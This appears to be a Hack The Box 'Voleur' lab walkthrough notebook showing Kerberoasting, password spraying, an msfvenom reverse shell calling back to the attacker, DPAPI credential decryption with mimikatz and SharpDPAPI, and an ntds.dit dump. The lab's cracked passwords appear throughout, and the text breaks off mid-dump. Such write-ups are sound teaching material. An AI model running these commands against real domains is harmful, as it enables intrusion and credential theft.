    $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$377f10133576c60a58a8a6c4d2aff471$85ef4de68b15de2717343a350bebd1a488aefaee9520ff8557aee9745a5d07f8e30fc8e003dcb2b9a8e17c7c83c39047a48d901941c29533a5d2f6a8035422900bc595023d21bd7948dd4f1b029151d5f6f6160c5f07befb1af5cbc7a61d7471b3db3ed98e4409e96bfe63c3cd6210172d4ade7fcf73cc359a2d379df23dd71c5dd4dae68cd674b86c1632cf0ee3847bed82f91cb05a69d9cbbb6cf727f72f5ff267996232e50e027fb9beacab0365e559087a643a259e5a103ba01891b7b1057de09a2cc3d40daf38dd3fbfbc74cde4a574d656a6be72e7cbc60347eadc83216cbcc421c6e46fc59eb112240124c3613f29f60a18fc1ceea75c7e88b8ebc572e088acbde5dd31eb8d7bf3e1e53cf7b1a7f2580d0e4b2b584d256a543f5c41f5017233e87d7428c7cd7de32d3e83277b0442284b040355c594205e4c6881c13229264a394bd8c8b70c0d223333b1958916a30dc78e66f5b1bcefb0bdc782dc8a3729f873b55b4149c6b7c60fa92b0d50c33e0ecca50d028ac309e8837610feefa86cfe8236c054dfad32313410e62aea8f5b64d2f625f38e2665169c4e0eb72e7117d170943adb32d37b1cb66c668711e5c2dc70cba6e1f10d069581c618038722661b44eb971c09854d02edfe86a146abfeebe7e39ac0268a4df6e5a379ccb6ac83f1396f1a00953a45516e6cd9066a0271f1ccaee5db79c17166e195b540eab37ca749c45cfe1f0952eb29f513d22adda1b20d3f7b71630e175eb01bd1e4294a3fb6ad2bd2d3daa0b50515598cb471290f061d72dde7725ee45d4bb1b453707eb148d13c9ec76f81a0cfea77d6136514bfd56d018e7ff67e3e4ace575a1fe6525f2a0832d6f8a00ebb1c82961881db750b1f19dc07fc71f2f2496d2a7e2d18d348d261e59cdcb70c224762f68aa2d8754b280dd36756330afa9b7c855327acc35bb94248aa5df7ea52d567242ded30ad9d36381880d6c63b68acacdf9c5f07e6e84c13f8d3b803a3bbe7341813fafa9562cbb7cbea6c7cb50bc48c81b9ed72e757db6d5a29f37d2410f64b9e7569ffad6d6b87b334cbec64c0f7b2b7c90707715595c639976e424ca6b7a6c48a40e7dfe3e2fb2c1c114b28c2929edeb2036419dd085b801205297b30e15bcb0918834719cc712bf0808c35922409bbbd19f250d11eb247d7a1ef840f110d8b434a24259431535dcea0f5162e4891ec843758e8c1a5380d8afadd73aac945cd5da55fd41ac27512b22326d18f3cc9dcf80a2d8042a53f652186f771da1630e71f3505e6e7b687f19d0c78e450ee79fa48d8d8b14884c535481e2bb080d68b48428167472aebe729be79ae38c73abf01eb40803c155c4a9bec213b6f1013d058026bc66a293dd1db6d3191211689228e2ab72358728d6723593a1ec2c15af89da4ff798fc6e52ffb9e63a04960a1430fb952e79c84bc008facdfe43d729f83b8f63454e9607b



```python
!hashcat roasted.lst rockyou.txt --show
```

    Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
    The following mode was auto-detected as the only one matching your input hash:
    
    13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
    
    NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
    Do NOT report auto-detect issues unless you are certain of the hash type.
    
    $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$b07bc1c0b81567d7c0a04085148d590f$4fc57e6b9c9bad7b69ae74a2e6052df5cd78e37b76d0a591231596a10dc15207fd70d5f69443c8f202161ddd1aa773d5dcd7a00c1be699a9059b3c45a9ff0b9771d52cd3a2544677cedf9f483faaf5f1f5ff62ff895cf111325d73bd2291bbbfc9912e43ab4d53351ad4d5705b25520eff5433ca9d199c567d2a1121b4ec41dcdf61e9b343cb4640a04d2c96c670e4d5ab0c37ba54c90fc322a2ef2b82f8618159a48721cf644693386e8f24ef01309b47f77256fe648c019c6b1c9586eed78ef830223f3ffce0ff872345fc29b4eaa1c25cba809c15ec026ba89ec80aa2f8a6d24719f09712bee73894dac88ef98946887e8c07307b6646b50dfc3c64592c99fac18d2732fc927ce0b3752e4c32baaf6a7d2ff00bfb606384be745f6258713ea48001377a8e4d17eeb79eb250adbf8dab380fa3136bb6a7cfdc3cc5dc8311bfc8cf54ba16c56d03a2151aeae6fe1609807e1c1b5b40b9ade5355a9b49f3fe94f8b68d9e2bdcbe28af734aab25e19e62c264d14ccc6003cb89efe7ef61542d9db699b9f031ddb391d722ce7642c87377ede65fabe0231c171a97a937a84e6e8b969f968ce094fc925d68d450064507b914d26dddac571af7405d7f200664980aa48fbd57f30825f40b9b36e7e0b4df36bd674e7e0bd7936adcc04beb422050d473ae15a7f1dbc502c5ec027bed96cfc2bcd0faec00c8999829c617ada6e719cd342665c7099f01cee54e720c0cb06976abf4872b93c8f7ee473af70b6a48597ec7d8acd1c34940930421a4284c93631a3453aa8f97150dc32f5e0b8a94631d97d1d175c89b9ccdc3236492471dc85d3fa05fddbf6988a47223c8aa184f6714b1dea0a5b18a2aef744e825912c6eff733c18f927f2ab56dbb36576040f4f7ebf042123a4a994c3c1d72029c1292035cdd4532fe0732b28627b8c5c8c82ed04050b6de98046e1d6e6bdaf1e50873b7b9b24cb1273d6bbf3b7089caef39f9c2c30d31ff3da15f5eb6d8739dfe96f13d50d18fdc9583b73dd60e5619d6f0ab50774c37fbc4100820815039b14945a8d10668304449d607346cc6ecd7636565f79ac6529701a8959df5ce01be61e3a67e40453d60d4a835ff9787261790aa3e929c2193ac429a1867435a413830906566c470982763e4069aa545bc7543272239bf8fe275cf2b7ee8c4a48f97269901204d13aeed63e161bf7616a7815a97c91e6ff4922de0a336281191fddb5fcbeb0ecf8a9607dbca55f3203b33e05e9f286193c81ec6ae71c630d824f1e36aeb2f6a01e727a55ae84cb6992af593c30abf8ffc86b09c28682d8f29a1725baf537fdc21e34d02d258fd8244c63c935788f0caf60896dff9aa280e3c33595d43462151296a2a5ac600c552d88e62e5f1ee85d60a1cc8856961d9bd793cc8beb73875aecc3f0bcdc006ff0fe85a1a0c5982d8873898e76ef03c18f77bf612ab58418a2d891acdadc3:AFireInsidedeOzarctica980219afi


Add our password to our list, and run kerbrute back.


```python
!kerbrute -domain $target -users ldeep/voleur_users_enabled.lst -passwords credentials
```

    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Valid user => svc_winrm
    [*] Valid user => jeremy.combs
    [*] Valid user => svc_iis
    [*] Valid user => svc_backup
    [*] Valid user => svc_ldap
    [*] Valid user => lacey.miller
    [*] Valid user => marie.bryant
    [*] Stupendous => ryan.naylor:HollowOct31Nyt
    [*] Saved TGT in ryan.naylor.ccache
    [*] Valid user => Administrator
    [*] Stupendous => svc_ldap:M1XyC9pW7qT5Vn
    [*] Saved TGT in svc_ldap.ccache
    [*] Stupendous => svc_iis:N5pXyW1VqM7CZ8
    [*] Saved TGT in svc_iis.ccache
    [*] Stupendous => svc_winrm:AFireInsidedeOzarctica980219afi
    [*] Saved TGT in svc_winrm.ccache


## Foothold

At some point I need a better documentation method of evil-winrm. For now, you get copy/paste.

```sh
 KRB5CCNAME=./svc_winrm.ccache KRB5_CONFIG=./krb5.conf evil-winrm -i dc.voleur.htb --realm=VOLEUR.HTB
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ../Desktop
ls
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---          7/5/2025   8:01 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
a5137dfe6682d7eaa2cb09b564271276
```

Here, since I've had so much trouble with NTLM auth, I'm going to prepare a reverse shell to use throughout this challenge.


```python
!msfvenom -p windows/x64/shell/reverse_tcp lport=9999 lhost=10.10.14.81 -f exe > msedge.exe
```

    Source locally installed gems is ignoring #<Bundler::StubSpecification name=rbs version=3.4.0 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=racc version=1.7.3 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=debug version=1.9.2 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=rbs version=3.4.0 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=racc version=1.7.3 platform=ruby> because it is missing extensions
    Source locally installed gems is ignoring #<Bundler::StubSpecification name=debug version=1.9.2 platform=ruby> because it is missing extensions
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 510 bytes
    Final size of exe file: 7168 bytes


Using winPEAS, we can see there's at least some refrence to DPAPI keys for the svc_winrm user. We should note this and make sure to look for other instances of this on the system as well. We'll crack and show any available passwords here as well.

```log
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\svc_winrm\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1601\2df1d8a3-cb47-4723-9d2e-b826b57a3952
    Accessed: 1/29/2025 7:07:34 AM
    Modified: 1/29/2025 7:07:34 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    CredFile: C:\Users\svc_winrm\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 2df1d8a3-cb47-4723-9d2e-b826b57a3952
    Accessed: 1/29/2025 7:07:35 AM
    Modified: 1/29/2025 7:07:35 AM
    Size: 11068
   =================================================================================================
```


```python
!KRB5CCNAME=./svc_winrm.ccache dpapi.py -debug masterkey -file "./2df1d8a3-cb47-4723-9d2e-b826b57a3952"  -k -no-pass -sid "S-1-5-21-3927696377-1337352550-2781715495-1601" -password "AFireInsidedeOzarctica980219afi"
```

    /home/tokugero/ctf/htb/season8/week8-voleur/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
      import pkg_resources
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [+] Impacket Library Installation Path: /home/tokugero/ctf/htb/season8/week8-voleur/.venv/lib/python3.13/site-packages/impacket
    [MASTERKEYFILE]
    Version     :        2 (2)
    Guid        : 2df1d8a3-cb47-4723-9d2e-b826b57a3952
    Flags       :        0 (0)
    Policy      :        0 (0)
    MasterKeyLen: 00000088 (136)
    BackupKeyLen: 00000068 (104)
    CredHistLen : 00000000 (0)
    DomainKeyLen: 00000174 (372)
    
    Cannot decrypt (specify -key or -sid whenever applicable) 


This key cannot be unprotected here. It seems that this may have been encrypted with a different credential or user.

Let's take another look at what permissions restore_users might have on the domain, since it's named very suspiciously. 


```python
!KRB5CCNAME=./svc_ldap.ccache nxc ldap dc.$target -d $target --use-kcache -k -M daclread -o TARGET_DN="DC=voleur,DC=htb" PRINCIPAL="restore_users"
```

    LDAP        dc.voleur.htb   389    DC.voleur.htb    [*]  x64 (name:DC.voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
    LDAP        dc.voleur.htb   389    DC.voleur.htb    [+] voleur.htb\svc_ldap from ccache
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    Be careful, this module cannot read the DACLS recursively.
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    Found principal SID to filter on: S-1-5-21-3927696377-1337352550-2781715495-1602
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    Target principal found in LDAP (DC=voleur,DC=htb)
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD                                            ACE[12] info                
    DACLREAD                                                ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
    DACLREAD                                                ACE flags                 : None
    DACLREAD                                                Access mask               : ControlAccess
    DACLREAD                                                Flags                     : ACE_OBJECT_TYPE_PRESENT
    DACLREAD                                                Object type (GUID)        : Reanimate-Tombstones (45ec5156-db7e-47bb-b53f-dbeb2d03c40f)
    DACLREAD                                                Trustee (SID)             : Restore_Users (S-1-5-21-3927696377-1337352550-2781715495-1602)
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')
    DACLREAD    dc.voleur.htb   389    DC.voleur.htb    [-] Error filtering ACE, probably because of ACE type unsupported for parsing yet ('ACE Type')


We see a tombstone permission on the domain for this group, which is something bloodhound won't show us. Since we can Reanimate-Tombstones, that means we can identify and reanimate todd.wolfe with his reset password from our xlsx file.

I couldn't do with this with my version of bloodyAD, but it seems the latest build from PyPi is able to do this as such:
`bloodyAD -d "voleur.htb" --host "dc.voleur.htb"  -k  -v INFO set restore todd.wolfe`

Instead, I used RunasCs.exe to execute a powershell script that loaded AD module and did the same thing.



```python
!cat restoretodd.ps1
```

    # Import the Active Directory module
    Import-Module ActiveDirectory
    
    # Search for deleted objects matching todd.wolfe (include deleted)
    $deletedUsers = Get-ADObject -Filter 'samaccountname -eq "todd.wolfe"' -IncludeDeletedObjects
    
    if ($deletedUsers) {
        # Sort by whenChanged descending to get the most recently deleted first
        $mostRecentUser = $deletedUsers | Sort-Object whenChanged -Descending | Select-Object -First 1
    
        Write-Host "Restoring user with ID: $($mostRecentUser.ObjectGUID)"
    
        # Restore the most recent user using their ObjectGUID as the identity
        Restore-ADObject -Identity $mostRecentUser.ObjectGUID
    } else {
        Write-Host "No deleted user found with samaccountname 'todd.wolfe'."
    }

```sh
*Evil-WinRM* PS C:\Windows\Temp> icacls restoretodd.ps1 /grant Everyone:F
processed file: restoretodd.ps1
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Windows\Temp> C:\Windows\Temp\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn 'powershell -ExecutionPolicy Bypass C:\Windows\Temp\restoretodd.ps1'
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

Restoring user with ID: 1c6b1deb-c372-4cbb-87b1-15031de169db
*Evil-WinRM* PS C:\Windows\Temp> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    jeremy.combs
krbtgt                   lacey.miller             marie.bryant
ryan.naylor              svc_backup               svc_iis
svc_ldap                 svc_winrm                todd.wolfe
```

Add credentials and run kerbrute back and we get todd's ccache.


```python
!kerbrute -domain $target -users ldeep/voleur_users_enabled.lst -passwords credentials
```

    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Valid user => svc_winrm
    [*] Valid user => jeremy.combs
    [*] Valid user => svc_iis
    [*] Valid user => svc_backup
    [*] Valid user => svc_ldap
    [*] Valid user => lacey.miller
    [*] Valid user => marie.bryant
    [*] Stupendous => ryan.naylor:HollowOct31Nyt
    [*] Saved TGT in ryan.naylor.ccache
    [*] Valid user => Administrator
    [*] Valid user => todd.wolfe
    [*] Stupendous => todd.wolfe:NightT1meP1dg3on14
    [*] Saved TGT in todd.wolfe.ccache
    [*] Stupendous => svc_ldap:M1XyC9pW7qT5Vn
    [*] Saved TGT in svc_ldap.ccache
    [*] Stupendous => svc_iis:N5pXyW1VqM7CZ8
    [*] Saved TGT in svc_iis.ccache
    [*] Stupendous => svc_winrm:AFireInsidedeOzarctica980219afi
    [*] Saved TGT in svc_winrm.ccache


Even though Todd has remote user access, I can't log in as him. So we're finally going to make good use of our msfvenom reverse shell.


```sh
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> C:\Windows\Temp\RunasCs.exe todd.wolfe NightT1meP1dg3on14 "whoami"
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

voleur\todd.wolfe
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> icacls C:\Windows\Temp\msedge.exe /grant Everyone:F
processed file: C:\Windows\Temp\msedge.exe
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> C:\Windows\Temp\RunasCs.exe todd.wolfe NightT1meP1dg3on14 "C:\Windows\Temp\msedge.exe"
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
```

> On the meterpreter:
 
```sh
[*] 10.129.28.61 - Command shell session 1 closed.  Reason: User exit
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.81:9999 
[*] Sending stage (336 bytes) to 10.129.28.61
[*] Command shell session 2 opened (10.10.14.81:9999 -> 10.129.28.61:52565) at 2025-07-06 00:33:34 -0700


Shell Banner:
Microsoft Windows [Version 10.0.20348.3807]
-----
          

C:\Windows\system32>whoami
whoami
voleur\todd.wolfe
```

We now have access to the Second-Line Support share via Todd's credentials. This folder only contains the user for todd.wolfe, so we suspect there must be somethign relevant here.

We find some hints of credentials:
```sh
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\roaming\microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110> ls
ls


    Directory: C:\IT\Second-Line Support\Archived 
    Users\todd.wolfe\appdata\roaming\microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88   
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\local\Microsoft\credentials> ls
ls


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\local\Microsoft\credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:53 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D 
```

In this case I'm using mimikatz through the reverse shell, evil-winrm does NOT like mimikatz.

I could use dpapi.py from impacket here as well if I needed this locally. If I do a key decrypt remotely for local decoding, I have to remember to pad the key with 0x<key>

```sh
mimikatz # dpapi::masterkey /in:"C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\roaming\microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88" /sid:"S-1-5-21-3927696377-1337352550-2781715495-1110" /password:NightT1meP1dg3on14 /protected
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {08949382-134f-4c63-b93c-ce52efc0aa88}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 48059cadeb79bc7cf66450c91ab9d923
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 035c8f507f8f295484<snip>25f0ae2e13b690137630e577004e5c72b6b988

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 1eef9c154f95634b6f180402d64d11fe
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 4ad4e3a9bb72ac854af774b35d718<snip>4beb596d

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {983a8b84-cac9-4e3f-ab10-deb81fee2f43}
    pbSecret         : 48e<snip>9b0c642a7a286e51c91b3727593405
    pbAccesscheck    : 7c0bcbc462df75b0621394<snip>f5a8289147b



[masterkey] with password: NightT1meP1dg3on14 (protected user)
  key : d2832547d1d5e0a01ef271ede2d299248d1cb0320061fd535<snip>5969ccae6f550650a83
  sha1: 7417f03ca0d4d557935d96b3f1341bdbbcdbd907
```

This credential is a onedrive credential I think, but nothing usable for us in this case.

```sh
mimikatz # dpapi::cred /in:"C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\local\Microsoft\credentials\DFBE70A7E5CC19A398EBF1B96859CE5D" /masterkey:d2832547d1d5e0a01ef271ed<snip>969ccae6f550650a83
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {08949382-134f-4c63-b93c-ce52efc0aa88}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : d8ff938827fdb011106c58d794fc7c52
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 526f1bce2d89272063b0b6d92d98d68e
  dwDataLen          : 00002a78 - 10872
  pbData             : <SNIP>
Decrypting Credential:
 * volatile cache: GUID:{08949382-134f-4c63-b93c-ce52efc0aa88};KeyHash:7417f03ca0d4d557935d96b3f1341bdbbcdbd907
 * masterkey     : d2832547d1d5e0a01ef271ede<snip>7c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 00002a76 - 10870
  credUnk0       : 00000000 - 0

  Type           : 00000001 - 1 - generic
  Flags          : 00000000 - 0
  LastWritten    : 1/29/2025 12:53:10 PM
  unkFlagsOrSize : 00000000 - 0
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000020 - 32
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : WindowsLive:target=virtualapp/didlogical
  UnkData        : (null)
  Comment        : PersistedCredential
  TargetAlias    : (null)
  UserName       : 02xsqpzotltkxgpg
  CredentialBlob : 
  Attributes     : 32
  **ATTRIBUTE**
    Flags   : 00000000 - 0
    Keyword : Microsoft_WindowsLive:authstate:0
<snip>
```

It took me a while to FINALLY try the credential in the roaming directory, and by then I had switched from mimikatz to SharpDPAPI to see if that gave me different results. The tool is the same with a different flavor, and bit easier to use in evil-winrm and elsewhere.

But here I'm using the masterkeyfile that could have as easily been the mimikatz equivalent, but on the crednetials folder in roaming:

```sh
PS C:\Users\todd.wolfe> C:/Windows/TEmp/SharpDPAPI.exe credentials /mkfile:./rawmkfile /target:"C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3"  /sid:S-1-5-21-3927696377-1337352550-2781715495-1110 /unprotect

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.3                               


[*] Action: User DPAPI Credential Triage

[*] Target Credential File: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3

  CredFile           : 772275FAD58525253490A9B0039791D3

    guidMasterKey    : {08949382-134f-4c63-b93c-ce52efc0aa88}
    size             : 398
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 1/29/2025 4:55:19 AM
    TargetName       : Domain:target=Jezzas_Account
    TargetAlias      : 
    Comment          : 
    UserName         : jeremy.combs
    Credential       : qT3V9pLXyN7W4m



SharpDPAPI completed in 00:00:00.0373120
```

Using our reverse shell again, and RunasCs with our new jeremy.combs credentials, we can see some files in their home directory.

```sh
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.81:9999 
[*] Sending stage (336 bytes) to 10.129.28.61
[*] Command shell session 8 opened (10.10.14.81:9999 -> 10.129.28.61:64564) at 2025-07-06 03:17:52 -0700


Shell Banner:
Microsoft Windows [Version 10.0.20348.3807]
-----
          

C:\Windows\system32>whoami
whoami
voleur\jeremy.combs
```

```sh
PS C:\IT\Third-Line Support> type Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

```sh
PS C:\IT\Third-Line Support> type id_rsa
type id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqFyPMvURW/qbyRlemAMzaPVvfR7JNHznL6xDHP4o/hqWIzn3dZ66
P2absMgZy2XXGf2pO0M13UidiBaF3dLNL7Y1SeS/DMisE411zHx6AQMepj0MGBi/c1Ufi7
rVMq+X6NJnb2v5pCzpoyobONWorBXMKV9DnbQumWxYXKQyr6vgSrLd3JBW6TNZa3PWThy9
wrTROegdYaqCjzk3Pscct66PhmQPyWkeVbIGZAqEC/edfONzmZjMbn7duJwIL5c68MMuCi
<snip>
B+3NLjpnGA5AqcPklI/lp6kSzEigvBl4nOz07fj3KchOGCRP3kpC5fHqXe24m3k2k9Sr+E
a29s98/18SfcbIOHWS4AUpHCNiNskDHXewjRJxEoE/CjuNnrVIjzWDTwTbzqQV+FOKOXoV
B9NzMi0MiCLy/HJ4dwwtce3sssxUk7pQAAAMEAzBk3mSKy7UWuhHExrsL/jzqxd7bVmLXU
EEju52GNEQL1TW4UZXVtwhHYrb0Vnu0AE+r/16o0gKScaa+lrEeQqzIARVflt7ZpJdpl3Z
fosiR4pvDHtzbqPVbixqSP14oKRSeswpN1Q50OnD11tpIbesjH4ZVEXv7VY9/Z8VcooQLW
GSgUcaD+U9Ik13vlNrrZYs9uJz3aphY6Jo23+7nge3Ui7ADEvnD3PAtzclU3xMFyX9Gf+9
RveMEYlXZqvJ9PAAAADXN2Y19iYWNrdXBAREMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

It seemed like a lifetime ago, but lets poke at that open ssh port 2222 we found.

```sh
 chmod 0400 jeremy.combs.rsa           
 ssh svc_backup@voleur.htb -p 2222 -i jeremy.combs.rsa
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  6 03:21:27 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   39%       IPv4 address for eth0: 10.129.28.61
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                          [ OK ] 
svc_backup@DC:~$ 

Since this is WSL and we know it's supposed to be doing windows backup, lets go take a look at that last `C:/IT/.../Backups` folder. For WSL that's going to be hiding in `/mnt/c/IT/.../Backups`
```

In here we find a folder called `Active Directory` and `registry`. The AD folder has the ntds files, and registry has the system hives.


```python
!secretsdump.py -ntds backups/'Active Directory/ntds.dit' -system backups/registry/SYSTEM LOCAL
```
```
    /home/tokugero/ctf/htb/season8/week8-voleur/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
      import pkg_resources
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
    [*] Reading and decrypting hashes from backups/Active Directory/ntds.dit 
